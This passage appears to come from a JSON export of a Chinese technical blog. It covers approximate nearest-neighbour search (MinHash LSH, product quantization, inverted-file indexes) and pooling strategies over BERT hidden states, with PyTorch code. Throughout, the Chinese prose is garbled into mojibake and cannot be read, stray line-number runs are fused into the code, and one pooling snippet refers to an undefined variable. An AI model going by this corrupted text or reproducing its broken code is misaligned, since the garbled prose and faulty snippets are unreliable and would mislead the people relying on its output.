å¬å›ç‡ä¼˜ç§€ï¼Œå’Œæš´åŠ›æœç´¢åŸºæœ¬ä¸€è‡´ åƒä¸‡é‡çº§çš„itemï¼Œæ„å›¾å¯åœ¨åˆ†é’Ÿçº§åˆ«å®Œæˆ å¤šæ ¸åˆ©ç”¨ä¼˜ç§€ æŸ¥è¯¢é€Ÿåº¦å¾ˆå¿« LSH åœ¨ min hash ä¹‹ä¸Šï¼Œæ›´è¿›ä¸€æ­¥ä¼˜åŒ–äº†åœ¨å¤§é‡æ–‡æœ¬ç›¸ä¼¼æ€§èšç±»çš„ç®—æ³•ã€‚é¦–å…ˆéœ€è¦è®¡ç®—æ¯ä¸€ä¸ªæ–‡æœ¬çš„å¤šä¸ªä¸åŒ min hash è¡¨ç¤ºï¼Œæ„æˆ min hash å€¼å‘é‡ã€‚ç„¶åå¯¹ min hash å‘é‡åˆ†å—è¿›è¡Œç®€å•çš„å…ƒç´ å¯¹æ¯”ï¼Œæ£€æŸ¥æ˜¯å¦ç›¸ä¼¼ã€‚æ­¤å¤„LSHï¼Œåªå…³æ³¨åŸºäº Jaccard similarity çš„æ–‡æœ¬å¤„ç†ï¼Œå…¶ä»–LSHå®ç°ä¸æ¶‰åŠã€‚ è¿™å°±æ˜¯ä¸€ç§åŸºäºè¯ç»Ÿè®¡çš„ hash åˆ†æ¡¶ç®—æ³•ã€‚å…¶ä¸­æ²¡æœ‰è®¡ç®—æ¬§å¼è·ç¦»è¿™ç§è®¡ç®—é‡è¾ƒå¤§çš„æ“ä½œï¼Œä»…ä»…æ˜¯å…ƒç´ å¯¹æ¯”ã€‚ ç®—æ³•å¦‚ä¸‹ï¼š å®šä¹‰: K -- å–æ–‡æœ¬ä¸­è¿ç»­ K ä¸ªè¯ä¸ºbag of wordsçš„è®¡æ•°å¯¹è±¡ï¼ˆè¿™é‡Œè¢«ç§°ä¸º K-Shinglingï¼‰ï¼› â€‹ N -- min hashå‘é‡çš„ç»´åº¦ï¼Œå³è¿›è¡Œéšæœº min hash çš„æ¬¡æ•°ï¼› â€‹ M -- æ–‡æœ¬æ€»æ•°ï¼› â€‹ b -- LSHä¸­hashåˆ†ç»„çš„ç»„æ•°ï¼› â€‹ r -- bç»„ min hash å­å‘é‡çš„ç»´åº¦ï¼› è¿‡ç¨‹ï¼š ==min hash== 1234561. å¯¹æ•´ä¸ªæ–‡æœ¬é›†æ„å»ºä»¥ K ä¸ªè¿ç»­è¯ä¸ºä¸€ä¸ªå¯¹è±¡çš„bag of wordsç»Ÿè®¡çŸ©é˜µï¼Œæ–‡æœ¬ä¸­å­˜åœ¨çš„å¯¹è±¡æ ‡è®°ä¸º1ï¼Œä¸å­˜åœ¨æ ‡è®°ä¸º0ï¼›2. for i in (1, ... , N): A. éšæœºæŒ‡å®šç»Ÿè®¡çŸ©é˜µä¸­ä¸€ä¸ª index ä¸ºèµ·å§‹ä½ç½®ï¼ˆä¿å­˜indexï¼‰ï¼› B. ä» index å¼€å§‹ï¼Œåœ¨æ¯ä¸€ä¸ªæ–‡æ¡£åˆ—ä¸­ï¼Œå‘ä¸‹æŸ¥æ‰¾ç¬¬ä¸€é 0 ä½ç½®ï¼› C. å–ç¬¬ä¸€é 0 ä½ç½®ä¸ index ä½ç½®çš„åç§»é‡ä¸º min hash å‘é‡çš„ç¬¬ i è¡Œï¼Œæœ‰ M ä¸ª min hash å‘é‡ï¼›3. å¾—åˆ° (N, M) çš„ min hash çŸ©é˜µ ==å±€éƒ¨æ•æ„Ÿhash(LSH)== 1234561. å°† min hash çŸ©é˜µå‡åˆ†ä¸º b ç»„ï¼›2. åˆ†æ¡¶èšç±»ï¼š for j in (1, ..., b): A. ä¸¤ä¸¤å¯¹æ¯”ç¬¬ j ç»„ min hash å­å‘é‡ï¼› B. å­å‘é‡å®Œå…¨ç›¸åŒæ—¶ï¼Œå°†è¯¥ä¸¤ä¸ªå‘é‡å¯¹åº”æ–‡æœ¬ï¼Œæ”¾åˆ°ä¸€ä¸ªç›¸ä¼¼æ¡¶ä¸­ï¼ˆç±»ä¼¼èšç±»ï¼‰ï¼›3. ä¿å­˜åˆ†æ¡¶ç»“æœï¼Œæ¯ä¸ªæ¡¶ä¸­å°±æ˜¯ç›¸ä¼¼çš„æ–‡æœ¬ å…³äº min hashï¼Œå®ƒå°±æ˜¯ä¸€ç§ Jaccrad similarity çš„å¦ä¸€ç§è¡¨ç¤ºã€‚ \\(P(hash(S_i)=hash(S_j))\\) å°±ç­‰ä»·äº \\(Jaccard(S_i, S_j)\\)ã€‚è¯æ˜ä¹ŸæŒºç®€å•çš„ï¼š åªçœ‹ä¸¤ä¸ª min hash å‘é‡ä¸­ä¸å…¨ä¸º 0 çš„è¡Œï¼Œè®°ä¸º \\(sub\\_hash\\)ã€‚ æ­¤æ—¶ \\(hash(S_i)=hash(S_j)\\) æ¦‚ç‡å°±ç­‰ä»·äº \\(sub\\_hash\\) çš„ç¬¬ä¸€è¡Œéƒ½ä¸º 1 çš„æ¦‚ç‡ã€‚ \\(sub\\_hash\\) çš„ç¬¬ä¸€è¡Œéƒ½ä¸º 1 çš„æ¦‚ç‡ï¼Œå°±ç­‰äº\\(sub\\_hash\\) ä¸­ï½›ä¸¤åˆ—éƒ½ä¸º 1 çš„è¡Œæ•° / ä»»æ„ä¸€åˆ—ä¸º 1 çš„è¡Œæ•°ï½ã€‚ \\(sub\\_hash\\) ä¸­ï½›ä¸¤åˆ—éƒ½ä¸º 1 çš„è¡Œæ•° / ä»»æ„ä¸€åˆ—ä¸º 1 çš„è¡Œæ•°ï½ï¼Œå°±æ˜¯ \\(Jaccard(S_i, S_j)\\)ã€‚ å¦å¤–ï¼Œè°ƒæ•´å‚æ•° b å’Œ r å¯ä»¥é—´æ¥è°ƒæ•´åˆ†æ¡¶çš„ç›¸ä¼¼æ€§é˜ˆå€¼ã€‚å‡è®¾ä¸¤ä¸ª min hash å‘é‡ç›¸ä¼¼æ¦‚ç‡ä¸º \\(p\\)ã€‚åˆ†åˆ°åŒä¸€ä¸ªæ¡¶ä¸­çš„æ¦‚ç‡å¯è¡¨ç¤ºä¸ºï¼ˆåªè¦æœ‰ä¸€ç»„ sub hash ç›¸åŒå°±åˆ†åˆ°ä¸€ä¸ªæ¡¶ï¼‰ï¼š \\[ 1 - (1 - p^r)^b \\] å¼€æºå·¥å…·åº“ï¼šmattilyra/LSH ç‰¹ç‚¹ï¼š æŸ¥æ‰¾é€Ÿåº¦å¿« æ–¹ä¾¿å»é‡å¤„ç† å¤„ç†å¤§é‡æ•°æ®é€Ÿåº¦è¾ƒå¿« Product Quantizer Product Quantizerç®€ç§°ä¸ºPQï¼Œæ˜¯ä¸€ç§å»ºç«‹ç´¢å¼•çš„æ–¹æ³•ã€‚ä¼˜åŒ–äº†K-Meansèšç±»çš„è®¡ç®—é‡ã€‚ å®šä¹‰ï¼š â€‹ N -- æ ·æœ¬æ€»é‡ï¼› â€‹ D -- embeddingç»´åº¦ï¼› â€‹ K -- å­ç©ºé—´æ•°é‡ï¼› â€‹ C -- K-meansèšç±»ç±»åˆ«æ•°ï¼› è¿‡ç¨‹ï¼š ==å»ºç´¢å¼•== 123456781. å°† N ä¸ª D ç»´embeddingï¼Œåˆ‡åˆ†ä¸º K ç»„ (N, D/K) çš„embeddingï¼›2. for i in (1, ..., K): A. å¯¹ç¬¬ i ä¸ª (N, D/K)çš„embeddingï¼Œè®¡ç®— C ä¸ªèšç±»ä¸­å¿ƒç‚¹3. for j in (1, ..., N): for k in (1, ..., K): A. å°†ç¬¬ j ä¸ªæ ·æœ¬æ ‡è®°åˆ°ç¬¬ k ç»„èšç±»çš„æ‰€å±ä¸­å¿ƒç‚¹ç¼–å·ï¼› B. å¾ªç¯å¾—åˆ°ç¬¬ j ä¸ªæ ·æœ¬çš„ K ç»´ä¸­å¿ƒç‚¹ç¼–å·å‘é‡ï¼› å¾—åˆ° (N, K) çš„æ ·æœ¬ç¼–ç çŸ©é˜µ ==æœç´¢== 123456789101112131415161. å°†è¾“å…¥ embedding åˆ’åˆ†ä¸º K ç»„ sub embeddingï¼›2. for i in (1, ..., K): for j in (1, ..., C): A. è®¡ç®— sub embedding ä¸èšç±»ä¸­å¿ƒ j çš„è·ç¦»ï¼› B. å¾ªç¯å¾—åˆ° C ç»´çš„è·ç¦»å‘é‡ï¼› å¾ªç¯å¾—åˆ° (K, C) çš„è·ç¦»çŸ©é˜µ3. è®¡ç®—è¾“å…¥ä¸æ‰€æœ‰æ ·æœ¬çš„è·ç¦»ï¼š for i in (1, ..., N): å– (N, K) çš„æ ·æœ¬ç¼–ç çŸ©é˜µä¸­ç¬¬ i è¡Œ (1, K), è®°ä¸º Q; å®šä¹‰è¾“å…¥ä¸æ ·æœ¬ i çš„è·ç¦»ä¸º diï¼› for k in (1, ..., K): A. å– Q[k] çš„å€¼ï¼Œè®°ä¸º qï¼› B. å– (K, C) çš„è·ç¦»çŸ©é˜µä¸­ç¬¬ k è¡Œï¼Œè®°ä¸º distï¼› C. di += dist[q]; è®°å½•è¾“å…¥ä¸æ ·æœ¬ i çš„è·ç¦»ä¸º di çš„å€¼ï¼›4. ä» N ä¸ª di è·ç¦»ä¸­æ‰¾åˆ°éœ€è¦çš„æ ·æœ¬ è¿™ç§æ–¹æ³•ï¼Œå°†æš´åŠ›æœç´¢ï¼Œè½¬åŒ–ä¸º K * N æ¬¡è·ç¦»è¡¨æŸ¥æ‰¾è¿‡ç¨‹ã€‚ Inverted File System è¿™ä¸ªæ–¹æ³•ï¼ˆç®€ç§° IVFï¼‰ç›¸å½“äºä½¿ç”¨å€’æ’è¡¨æ¥ä¼˜åŒ–ç´¢å¼•ã€‚æ¯”å¦‚ IVF + PQï¼Œæ¥ä¼˜åŒ– K * N æ¬¡çš„æŸ¥è¯¢æ“ä½œã€‚IVFï¼Œ PQ åœ¨ Faiss åº“ä¸­éƒ½æœ‰å®ç°ã€‚ ç®€è¿°ä¸€ä¸‹æ–¹æ³•ï¼š åœ¨ PQ å»ºç«‹ç´¢å¼•çš„è¿‡ç¨‹ä¸­å¢åŠ ä¸€æ­¥ï¼š å°† (N, K) çš„æ ·æœ¬ï¼Œåˆ†åˆ«ä¿å­˜åˆ° C_ivfä¸ªèšç±»ä¹‹ä¸‹ï¼Œå³ï¼Œä¿å­˜åˆ° C_ivfä¸ªä»£è¡¨ä¸€ä¸ªç±»çš„æ•°ç»„ä¸­ã€‚å¾—åˆ° C_ivf ä¸ªç±»åˆ«å­—å…¸ï¼Œkey ä¸ºèšç±»ä¸­å¿ƒç‚¹ï¼ˆidï¼‰ï¼Œvalue ä¸ºè¯¥èšç±»ä¸­æ‰€æœ‰æ ·æœ¬ç‚¹çš„ PQ ç¼–ç æ•°ç»„ã€‚ï¼ˆæŒ‰ç…§ C_ivfä¸ªèšç±»ç±»åˆ«è¿›è¡Œå€’æ’æ ·æœ¬ï¼‰ åœ¨ PQ æŸ¥è¯¢ä¸­å¢åŠ ä¸€æ­¥ï¼š åœ¨ç¬¬ä¸‰æ­¥ç¬¬äºŒå±‚ for å¾ªç¯ä¸­ï¼Œå…ˆæ±‚å¾—ä¸è¾“å…¥æ ·æœ¬æœ€è¿‘çš„ C_ivf èšç±»ä¸­å¿ƒï¼Œç„¶ååœ¨è¯¥èšç±»çš„ PQ ç¼–ç æ•°ç»„ä¸­è®¡ç®—æ¯ä¸ªæ ·æœ¬ä¸è¾“å…¥çš„è·ç¦»ã€‚ åˆ©ç”¨å€’æ’ï¼Œå‡å°‘äº†æœç´¢èŒƒå›´ã€‚ä»å…¨éƒ¨æ ·æœ¬æœç´¢ï¼Œå˜æˆå…ˆæ‰¾èšç±»ï¼Œå†åœ¨ç±»ä¸­æœç´¢ã€‚ è¿™é‡Œå»ºç«‹å€’æ’çš„ K-means èšç±»ä¸ PQ ä¸­ä½¿ç”¨çš„ä¸åŒï¼Œä½¿ç”¨ä¸€ä¸ªæ›´ç²—ç²’åº¦çš„ K-means èšç±»ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹ N ä¸ª embedding è¿›è¡Œåˆ’åˆ†ã€‚ æ˜¾ç„¶ï¼ŒIVFè™½ç„¶å»ºç«‹ç´¢å¼•çš„è¿‡ç¨‹æ›´å¤æ‚ä¸€äº›ï¼Œä½†æ˜¯æœç´¢çš„è¿‡ç¨‹ä¼šæ›´å¿«é€Ÿã€‚ Structure-based Approximations è¿™ç±»è¿‘ä¼¼æœç´¢ï¼Œå°†æœç´¢è¿‡ç¨‹æŠ½è±¡ä¸ºä¸€ä¸ªç¥ç»ç½‘ç»œè¡¨ç¤ºçš„å‡½æ•°ï¼Œè¾“å…¥å¯¹è±¡ï¼Œè¾“å‡ºæœç´¢ç»“æœã€‚å½“ç„¶ä»¥ä¸‹æ–¹æ³•éœ€è¦ç›‘ç£æ•°æ®æ”¯æŒï¼Œæˆ–è€…å¯ä»¥æ„å»ºæ— ç›‘ç£çš„å…±ç°å…³ç³»ã€‚ Negative sampling softmax: ç®€åŒ–ç‰ˆçš„NCEè¿‘ä¼¼è®¡ç®—ï¼Œå°†å¤šåˆ†ç±»ï¼Œè½¬ä¸ºå¤šä¸ªæ­£è´Ÿä¾‹äºŒåˆ†ç±»ã€‚å¤æ‚çš„è´Ÿä¾‹åˆ†å¸ƒæŠ½æ ·æ—¶ï¼Œå¯ä»¥é‡‡ç”¨importance samplingè¿›è¡Œç®€åŒ–ã€‚ Class-based softmax: ä½¿ç”¨ä¸¤ä¸ªsoftmaxï¼Œç¬¬ä¸€ä¸ªé¢„æµ‹ classï¼Œç¬¬äºŒä¸ªåŸºäºè¾“å…¥å’Œ class é¢„æµ‹æœç´¢ç›®æ ‡ã€‚ Hierarchical softmaxï¼š æ„å»º Huffman treeï¼Œç„¶åæ¯ä¸ªèŠ‚ç‚¹åªè¿›è¡Œä¸€ä¸ªäºŒå€¼åˆ†ç±»é¢„æµ‹ï¼Œç›´åˆ°å¶å­èŠ‚ç‚¹ã€‚é¢„æµ‹ç›´æ¥å˜æˆäº† tree height æ¬¡äºŒåˆ†ç±»è®¡ç®—ã€‚ Binary code predictionï¼š å°†æ‰€æœ‰å¯¹è±¡çš„indexï¼Œè½¬åŒ–ä¸ºäºŒè¿›åˆ¶è¡¨ç¤ºï¼Œä½¿ç”¨å¤šä¸ªsigmoidï¼Œé¢„æµ‹æ¯ä¸ªä½ç½®æ˜¯ 0 è¿˜æ˜¯ 1ï¼Œå¾—åˆ°ç›®æ ‡indexçš„äºŒè¿›åˆ¶è¡¨ç¤ºã€‚ Embedding Predictionï¼š é¢„æµ‹ embedding è¡¨ç¤ºã€‚è¿™ä¸ªæ–¹æ³•æ˜¯å¯¹ Embedding inference æ¨¡å‹çš„è¿‘ä¼¼ï¼Œæ€è·¯åŸºæœ¬ä¸Šå’Œè’¸é¦å·®ä¸å¤šã€‚å¯¹äºä¸‹æ¸¸æœç´¢åŒ¹é…ï¼Œæ²¡æœ‰å½±å“ã€‚è¿™ä¸ªæ–¹æ³•ç”¨åˆ°ä¸€ç§æŸå¤±ï¼ŒVon-Mises Fisher distribution lossï¼Œçº¦æŸäº†è¾“å‡ºembeddingé è¿‘ä¸€ä¸ªå•ä½çƒé¢ï¼ˆè¶…çƒé¢ï¼‰ã€‚ End ç›¸ä¼¼æ€§æœç´¢ï¼Œå’Œè®¡ç®— margin loss çš„åˆ†ç±»é—®é¢˜ç›®æ ‡æ¯”è¾ƒæ¥è¿‘ã€‚ \\[ Loss_{margin}(x,y,\\hat{y})=max(0, 1+s(\\hat{y}|x)-s(y|x)) \\] å¦å¤–ï¼ŒåŸºäºæ ‘çš„æœç´¢ï¼Œè¿˜æœ‰KD Treeç®—æ³•ï¼Œè¿™é‡Œä¸æ¶‰åŠã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"searching","slug":"searching","permalink":"https://racleray.github.io/tags/searching/"}]},{"title":"Practical BERT","slug":"Practical-BERT","date":"2021-07-22T08:01:17.000Z","updated":"2023-08-07T11:54:31.033Z","comments":true,"path":"posts/372ecc5c.html","link":"","permalink":"https://racleray.github.io/posts/372ecc5c.html","excerpt":"","text":"BERTç±»æ¨¡å‹ï¼ŒåŸºæœ¬ä½¿ç”¨æµç¨‹ï¼š1. Further pretrain. 2. single-task or multi-task finetuning. 3. inference Further pretrainingä¸€èˆ¬ä½¿ç”¨ä»»åŠ¡æ•°æ®è¿›è¡Œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸ä»»åŠ¡æ•°æ®ç›¸ä¼¼çš„ in-domain æ•°æ®ï¼Œæˆ–è€…ä½¿ç”¨æ•°æ®é‡æ›´å¤§ä½†æ˜¯å’Œä»»åŠ¡æ•°æ®ä¸é‚£ä¹ˆç›¸å…³çš„æ•°æ®è¿›è¡Œã€‚ ä¸€èˆ¬è€Œè¨€ä½¿ç”¨ä»»åŠ¡æ•°æ®çš„æ•ˆæœä¼šå¥½ä¸€äº›ã€‚ä½†æ˜¯æ•°æ®é‡ä¸è¶³ï¼Œä¸”èƒ½æ‰¾åˆ°ä¸ä»»åŠ¡æ•°æ®ç›¸ä¼¼çš„ in-domain æ•°æ®ï¼Œä¹Ÿå¯ä»¥ç¨³å®šæé«˜æ¨¡å‹æ•ˆæœã€‚ï¼ˆrefï¼‰ Transformer Representations Transformer ä¸åŒçš„å±‚æ•è·ä¸åŒå±‚æ¬¡çš„è¡¨ç¤ºã€‚æ¯”å¦‚ã€ä¸‹å±‚æ˜¯è¡¨å±‚ï¼ˆå­—ã€è¯ï¼‰ç‰¹å¾ï¼Œä¸­å±‚æ˜¯å¥æ³•ç‰¹å¾ï¼Œä¸Šå±‚æ˜¯è¯­ä¹‰ç‰¹å¾ã€‚ å¦‚å›¾ä¸ºä¸åŒçš„embeddingè¡¨ç¤ºï¼Œè¾“å…¥BiLSTMè¿›è¡ŒNERä»»åŠ¡çš„ç»“æœå¯¹æ¯”ã€‚ BERTçš„ä¸åŒå±‚ç¼–ç çš„ä¿¡æ¯éå¸¸ä¸åŒï¼Œå› æ­¤é€‚å½“çš„æ± åŒ–ç­–ç•¥ï¼Œåº”è¯¥æ ¹æ®ä¸åŒåº”ç”¨è€Œæ”¹å˜ï¼Œå› ä¸ºä¸åŒçš„å±‚ç¼–ç ä¸åŒçš„ä¿¡æ¯ã€‚ Hugging Faceçš„BERTæ¨¡å‹ä¸€èˆ¬è¾“å‡ºä¸ºï¼š last hidden state (batch size, seq len, hidden size) which is the sequence of hidden states at the output of the last layer. pooler output (batch size, hidden size) - Last layer hidden-state of the first token of the sequence hidden states (n layers, batch size, seq len, hidden size) - Hidden states for all layers and for all ids. Pooler output pooler outputï¼Œæœ€åä¸€å±‚çš„[CLS] tokençš„hidden stateï¼Œæ¥ä¸€ä¸ªLinear layer å’Œä¸€ä¸ª Tanh activation functionçš„ç»“æœã€‚é¢„è®­ç»ƒæ—¶ï¼Œä½œä¸ºnext sentence prediction (classification) objectiveçš„è®¡ç®—ç»“æœã€‚ åœ¨configä¸­å¯ä»¥è®¾ç½® pooling layer ä¸º Falseï¼Œä¸è¾“å‡ºè¿™ä¸€ç»“æœã€‚ 1234567891011121314151617181920212223242526...max_seq_length = 256_pretrained_model = 'roberta-base'config = AutoConfig.from_pretrained(_pretrained_model)model = AutoModel.from_pretrained(_pretrained_model, config=config)tokenizer = AutoTokenizer.from_pretrained(_pretrained_model)clear_output()features = tokenizer.batch_encode_plus( train_text, add_special_tokens=True, padding='max_length', max_length=max_seq_length, truncation=True, return_tensors='pt', return_attention_mask=True)outputs = model(features['input_ids'], features['attention_mask'])pooler_output = outputs[1]logits = nn.Linear(config.hidden_size, 1)(pooler_output) # regression head... More than last hidden state æœ€åä¸€å±‚è¾“å‡ºçš„ hidden stateï¼Œ[batch, maxlen, hidden_state]ã€‚å…¶ä¸­[batch, 1, hidden_state]å¯¹åº” [CLS]ã€‚ CLS Embeddings 12345with torch.no_grad(): outputs = model(features['input_ids'], features['attention_mask'])last_hidden_state = outputs[0]cls_embeddings = last_hidden_state[:, 0] å¯ä»¥å¤„ç†ç®€å•çš„ä¸‹æ¸¸ä»»åŠ¡ï¼Œå°†cls_embeddingsä½œä¸ºæ•´ä¸ªåºåˆ—çš„ä¸€ä¸ªç®€å•è¡¨ç¤ºã€‚ Mean Pooling 1234567891011121314151617181920212223features = tokenizer.batch_encode_plus( train_text, add_special_tokens=True, padding='max_length', max_length=max_seq_length, truncation=True, return_tensors='pt', return_attention_mask=True)attention_mask = features['attention_mask']...# Step 1: Expand Attention Mask from [batch_size, max_len] to [batch_size, max_len, hidden_size].input_mask_expanded = attention_mask.unsqueeze(-1).expand(last_hidden_state.size()).float()# Step 2: Sum Embeddings along max_len axis so now we have [batch_size, hidden_size]sum_embeddings = torch.sum(last_hidden_state * input_mask_expanded, 1)# Step 3: Sum Mask along max_len axis.sum_mask = input_mask_expanded.sum(1)sum_mask = torch.clamp(sum_mask, min=1e-9)# Step 4: Take Average.mean_embeddings = sum_embeddings / sum_masklogits = nn.Linear(config.hidden_size, 1)(mean_embeddings) # regression head åœ¨max lenç»´åº¦ï¼Œè¿›è¡Œå¹³å‡ã€‚ Max Pooling åœ¨max lenç»´åº¦ï¼Œè¿›è¡Œmax pooling 123# input_mask_expanded = attention_mask.unsqueeze(-1).expand(last_hidden_state.size()).float()# last_hidden_state[input_mask_expanded == 0] = -1e9 # Set padding tokens to large negative valuemax_embeddings = torch.max(last_hidden_state, 1)[0] Mean-Max Pooling (Head) 123456789101112input_mask_expanded = attention_mask.unsqueeze(-1).expand(last_hidden_state.size()).float()sum_embeddings = torch.sum(last_hidden_state * input_mask_expanded, 1)sum_mask = input_mask_expanded.sum(1)sum_mask = torch.clamp(sum_mask, min=1e-9)mean_embeddings = sum_embeddings / sum_maskmax_pooling_embeddings, _ = torch.max(last_hidden_state, 1)cls_embeddings = last_hidden_state[:, 0]mean_max_embeddings = torch.cat((mean_pooling_embeddings, max_pooling_embeddings, cls_embeddings), 1)logits = nn.Linear(config.hidden_size * 3, 1)(mean_max_embeddings) # 3 hidden size Conv-1D Pooling 12345678# first define layerscnn1 = nn.Conv1d(768, 256, kernel_size=2, padding=1)cnn2 = nn.Conv1d(256, 1, kernel_size=2, padding=1)last_hidden_state = last_hidden_state.permute(0, 2, 1) # (batch size, hidden size, seq len)cnn_embeddings = F.relu(cnn1(last_hidden_state))cnn_embeddings = cnn2(cnn_embeddings)logits, _ = torch.max(cnn_embeddings, 2) # max pooling in Length dim More than Hidden States Output embeddings ä¸ æ¯ä¸€å±‚çš„è¾“å‡ºé›†åˆï¼Œ(n_layers, batch_size, sequence_length, hidden_size)ã€‚ 123456789101112131415161718192021222324...max_seq_length = 256_pretrained_model = 'roberta-base'config = AutoConfig.from_pretrained(_pretrained_model)# è®¾ç½®è¾“å‡ºé€‰é¡¹config.update(&#123;'output_hidden_states':True&#125;)model = AutoModel.from_pretrained(_pretrained_model, config=config)tokenizer = AutoTokenizer.from_pretrained(_pretrained_model)clear_output()features = tokenizer.batch_encode_plus( train_text, add_special_tokens=True, padding='max_length', max_length=max_seq_length, truncation=True, return_tensors='pt', return_attention_mask=True)with torch.no_grad(): outputs = model(features['input_ids'], features['attention_mask'])all_hidden_states = torch.stack(outputs[2]) CLS Layer Embeddings å€’æ•°ç¬¬äºŒå±‚ç¤ºä¾‹ 1234layer_index = 11 # second to last hidden layercls_embeddings = all_hidden_states[layer_index, :, 0] # 13 layers (embedding + num of blocks)logits = nn.Linear(config.hidden_size, 1)(cls_embeddings) # regression head GitHubçš„bert-as-service é¡¹ç›®ï¼Œå°±æ˜¯é»˜è®¤å–å¾—å€’æ•°ç¬¬äºŒå±‚çš„è¾“å‡ºã€‚æ›´å¥½åœ°è¡¨ç¤ºè¯­ä¹‰ï¼Œè€Œä¸è¢«MLMä»»åŠ¡å’ŒNSPä»»åŠ¡å½±å“å¤ªå¤šã€‚ Concatenate Pooling æœ€åå››å±‚ CLS concat. 12345678all_hidden_states = torch.stack(outputs[2])concatenate_pooling = torch.cat( (all_hidden_states[-1], all_hidden_states[-2], all_hidden_states[-3], all_hidden_states[-4]), -1)concatenate_pooling = concatenate_pooling[:, 0] # first tokenlogits = nn.Linear(config.hidden_size*4, 1)(concatenate_pooling) Weighted Layer Pooling åŸºäºä¸€ä¸ªintuitionï¼Œfine-tuningæ—¶ï¼Œæœ€å®¹æ˜“è¢«è®­ç»ƒçš„åº”è¯¥æ˜¯middle layerçš„è¡¨è¾¾ï¼Œå› ä¸ºé¡¶å±‚æ˜¯ä¸“é—¨ç”¨äº language modeling pre-train ä»»åŠ¡çš„ã€‚æ‰€ä»¥åªä½¿ç”¨é¡¶å±‚çš„è¾“å‡ºè¿›è¡Œä¸‹æ¸¸ä»»åŠ¡ï¼Œä¼šé™åˆ¶æ¨¡å‹çš„æ•ˆæœã€‚ï¼ˆæ²¡æœ‰å®è¯ï¼Œä¸€ä¸ªå‡è®¾ï¼‰ 12345678910111213141516171819202122232425class WeightedLayerPooling(nn.Module): def __init__(self, num_hidden_layers, layer_start: int = 4, layer_weights = None): super(WeightedLayerPooling, self).__init__() self.layer_start = layer_start self.num_hidden_layers = num_hidden_layers self.layer_weights = layer_weights if layer_weights is not None \\ else nn.Parameter( torch.tensor([1] * (num_hidden_layers+1 - layer_start), dtype=torch.float) ) def forward(self, all_hidden_states): all_layer_embedding = all_hidden_states[self.layer_start:, :, :, :] weight_factor = self.layer_weights.unsqueeze(-1).unsqueeze(-1).unsqueeze(-1).expand(all_layer_embedding.size()) weighted_average = (weight_factor*all_layer_embedding).sum(dim=0) / self.layer_weights.sum() return weighted_average # ä½¿ç”¨ï¼šæœ€åå››å±‚çš„ CLS è¡¨ç¤ºï¼Œè®¡ç®—åŠ æƒå’Œlayer_start = 9pooler = WeightedLayerPooling( config.num_hidden_layers, layer_start=layer_start, layer_weights=None)weighted_pooling_embeddings = pooler(all_hidden_states)weighted_pooling_embeddings = weighted_pooling_embeddings[:, 0]logits = nn.Linear(config.hidden_size, 1)(weighted_pooling_embeddings) LSTM/GRU Pooling \\[ o = h^L_{LSTM} =LSTM(h^i_{CLS}), i âˆˆ [1, L] \\] CLS tokenè¾“å…¥LSTMï¼Œå¾—åˆ°æœ€ç»ˆè¡¨ç¤º 12345678910111213141516171819202122class LSTMPooling(nn.Module): def __init__(self, num_layers, hidden_size, hiddendim_lstm): super(LSTMPooling, self).__init__() self.num_hidden_layers = num_layers self.hidden_size = hidden_size self.hiddendim_lstm = hiddendim_lstm self.lstm = nn.LSTM(self.hidden_size, self.hiddendim_lstm, batch_first=True) self.dropout = nn.Dropout(0.1) def forward(self, all_hidden_states): ## forward hidden_states = torch.stack([all_hidden_states[layer_i][:, 0].squeeze() for layer_i in range(1, self.num_hidden_layers+1)], dim=-1) hidden_states = hidden_states.view(-1, self.num_hidden_layers, self.hidden_size) out, _ = self.lstm(hidden_states, None) out = self.dropout(out[:, -1, :]) return outhiddendim_lstm = 256pooler = LSTMPooling(config.num_hidden_layers, config.hidden_size, hiddendim_lstm)lstm_pooling_embeddings = pooler(all_hidden_states)logits = nn.Linear(hiddendim_lstm, 1)(lstm_pooling_embeddings) # regression head Attention Pooling dot-product attentionï¼š \\[ o = W^T_{h} softmax(qh^T_{CLS})h_{CLS} \\] \\(W^T_{h}\\) å’Œ \\(q\\)ä¸ºå¯å­¦ä¹ å‚æ•°ã€‚ 1234567891011121314151617181920212223242526272829303132class AttentionPooling(nn.Module): def __init__(self, num_layers, hidden_size, hiddendim_fc): super(AttentionPooling, self).__init__() self.num_hidden_layers = num_layers self.hidden_size = hidden_size self.hiddendim_fc = hiddendim_fc self.dropout = nn.Dropout(0.1) q_t = np.random.normal(loc=0.0, scale=0.1, size=(1, self.hidden_size)) self.q = nn.Parameter(torch.from_numpy(q_t)).float() w_ht = np.random.normal(loc=0.0, scale=0.1, size=(self.hidden_size, self.hiddendim_fc)) self.w_h = nn.Parameter(torch.from_numpy(w_ht)).float() def forward(self, all_hidden_states): hidden_states = torch.stack([all_hidden_states[layer_i][:, 0].squeeze() for layer_i in range(1, self.num_hidden_layers+1)], dim=-1) hidden_states = hidden_states.view(-1, self.num_hidden_layers, self.hidden_size) out = self.attention(hidden_states) out = self.dropout(out) return out def attention(self, h): v = torch.matmul(self.q, h.transpose(-2, -1)).squeeze(1) v = F.softmax(v, -1) v_temp = torch.matmul(v.unsqueeze(1), h).transpose(-2, -1) v = torch.matmul(self.w_h.transpose(1, 0), v_temp).squeeze(2) return vhiddendim_fc = 128pooler = AttentionPooling(config.num_hidden_layers, config.hidden_size, hiddendim_fc)attention_pooling_embeddings = pooler(all_hidden_states)logits = nn.Linear(hiddendim_fc, 1)(attention_pooling_embeddings) # regression head WKPooling æ¥è‡ªè®ºæ–‡: SBERT-WK: A Sentence Embedding Method By Dissecting BERT-based Word Models é€šè¿‡è®¡ç®— æ¯ä¸€å±‚æ¯ä¸ªtokençš„ alignment and novelty propertiesï¼Œå¾—åˆ°æ¯ä¸ªtokençš„ unified word representationã€‚ç„¶åæ ¹æ®è®¡ç®—å¾—åˆ°æ¯ä¸ªtoken çš„ word importance ï¼ŒåŠ æƒæ±‚å’Œå¾—åˆ°ä¸€ä¸ª Sentence Embedding è¡¨ç¤ºã€‚ è®¡ç®—ä¸­ç”¨åˆ° 